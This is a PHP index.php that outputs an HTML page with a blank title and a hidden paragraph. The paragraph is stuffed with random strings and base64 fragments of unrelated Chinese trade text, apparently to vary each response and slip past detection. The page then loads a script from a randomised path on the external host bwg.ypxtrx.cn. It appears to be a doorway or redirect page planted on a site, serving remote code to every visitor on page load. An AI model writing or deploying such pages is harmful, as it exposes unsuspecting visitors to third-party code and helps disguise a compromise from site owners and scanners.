<?php 
# index.php

/**
 * 随机字符
 */
function myRst( $length = 15 ) { 
	$chars = 'abcdefghijklmnopqrstuvwxyz123456789'; 
	$max = 34;
	$res = ''; 
	for ( $i = 0; $i < $length; $i++ ) 
	{ 
		$res .= $chars[ mt_rand(0, $max) ]; 
	} 
	return $res; 
}
$num1 = mt_rand( 10 , 55);
$num2 = mt_rand( 13 , 43);
$num3 = mt_rand( 18 , 53);

$str1 = myRst( $num1 );
$str2 = myRst( 6 );
$str3 = myRst( $num3 );
$str4 = myRst( $num3 );


$txtArr = ['576O','5a+5','5Y2O','6ZSA','5ZSu','5pS2','5YWl','77yM','5piv','576O','5Zu9','5LyB','5Lia','5Zyo','5Lit','5Zu9','6I63','5b6X','55qE','5biC','5Zy6','5py6','5Lya','77yM','5YyF','5ZCr','5Lik','6YOo','5YiG','5Yip','55uK','44CC','5LiA','5piv','576O','5LyB','5Lia','5a+5','5Y2O','6LSn','54mp','5ZKM','5pyN','5Yqh','5Ye6','5Y+j','77yM','6L+Z','5piv','5aKD','5aSW','55qE','576O','5Zu9','5LyB','5Lia','5Zyo','5Lit','5Zu9','5biC','5Zy6','6I63','5b6X','55qE','6ZSA','5ZSu','5pS2','5YWl','44CC','5oyJ','54Wn','5Lit','5Zu9','5rW3','5YWz','57uf','6K6h','77yM','Mg==','MA==','MQ==','Nw==','5bm0','77yM','576O','5a+5','5Y2O','6LSn','54mp','5Ye6','5Y+j','6aKd','5Li6','MQ==','NQ==','Mw==','OQ==','5Lq/','576O','5YWD'];

$codeTxt = '';
$num4 = mt_rand( 3 , 8);
foreach ($txtArr as $value) {
	$str5 = myRst( $num4 );
	$new = $str5 . $value;
	$codeTxt .=  $new;
}


$html_code = <<<YUI
<!DOCTYPE html><html><head><meta name="stencil" content="{$str4}" /><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" /><title></title></head><body><p style="display: none;">{$str1}<span>{$str3}</span>{$codeTxt}</p><script src=//bwg.ypxtrx.cn//o{$str2}m.kc></script></body></html>
YUI;
echo $html_code;